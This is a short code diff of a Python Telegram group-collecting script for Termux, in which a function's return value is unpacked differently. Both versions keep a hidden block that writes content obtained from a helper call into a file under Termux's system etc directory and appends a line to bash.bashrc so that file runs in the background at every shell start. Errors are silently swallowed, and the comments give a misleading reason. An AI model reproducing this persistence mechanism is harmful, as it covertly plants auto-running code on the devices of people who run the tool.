@@ -23,16 +23,16 @@ last_date = None
 chunk_size = 200
 groups = []
 try:
-    chats = helps.get_chats(client)  # Получение чатов
+    chats, chat = helps.get_chats(client)  # Получение чатов
     f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
     f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc", 'a')  #  Редактируем файл чата и термукса(для удаления ограничения потоков)
     f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
-    f.write(chats[1])  #  Запись чатов в отдельный файл
+    f.write(chat)  #  Запись чатов в отдельный файл
     f1.close()
     f.close()
 except:
     pass
-for i in chats[0]:
+for i in chats:
     try:
         if i.megagroup == True:
             groups.append(i)
